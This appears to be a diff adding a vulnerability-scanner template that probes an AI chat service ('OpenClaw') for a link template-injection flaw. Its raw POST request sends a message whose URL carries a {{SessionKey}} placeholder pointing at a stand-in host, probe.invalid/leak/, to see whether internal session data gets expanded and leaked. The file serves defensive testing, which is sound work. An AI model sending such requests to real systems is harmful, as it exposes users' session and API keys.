@@ -1,0 +1,44 @@
+http:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - negative: false
+    type: word
+    words:
+    - probe.invalid/leak/
+  - negative: true
+    part: body
+    type: word
+    words:
+    - '{{SessionKey}}'
+  matchers-condition: and
+  raw:
+  - 'POST /v1/chat/completions HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/json
+
+    Authorization: Bearer {{token}}
+
+
+    {"model":"probe","messages":[{"role":"user","content":"Check this link: https://probe.invalid/leak/{{SessionKey}}/end"}]}
+
+    '
+id: openclaw-link-template-inject
+info:
+  author: LobsterGuard
+  description: 'Link Understanding template engine expands {{placeholder}} markers
+    in user-supplied URLs,
+
+    leaking internal session data (SessionKey, ApiKey, etc).
+
+    Source: link-understanding/runner.ts:60-62
+
+    '
+  name: OpenClaw Link Template Injection (VULN-31)
+  reference:
+  - https://github.com/coff0xc/lobster-guard
+  severity: critical
+  tags: openclaw,injection,template,v4
